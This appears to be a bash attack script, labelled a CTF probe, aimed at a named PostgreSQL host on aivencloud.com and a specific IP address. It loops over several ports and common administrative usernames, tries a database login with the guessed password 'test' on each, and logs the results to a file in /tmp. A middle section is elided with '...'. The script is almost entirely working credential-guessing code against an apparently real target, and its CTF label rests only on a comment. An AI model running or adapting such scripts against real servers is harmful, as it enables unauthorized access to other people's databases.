#!/bin/bash
# CTF probe v3 - inside-perimeter: full sweep + PG + pghostile chain
TARGET=falcon-bug-bounty-flag-pgsql-dev-sandbox.aivencloud.com
IP=132.145.191.135
OUT=/tmp/probe_results.txt
echo "=== PROBE V3 START $(date -u) ===" > $OUT
...
echo "=== PG AUTH ATTEMPTS ===" >> $OUT
for p in 5432 5433 22293 54321; do
  for u in avnadmin postgres admin ctf falcon sandbox; do
    echo "--- psql $u@:$p ---" >> $OUT
    timeout 6 psql "postgresql://$u:test@$IP:$p/postgres?connect_timeout=4" -c "SELECT version();" >> $OUT 2>&1
    echo "" >> $OUT
  done
done
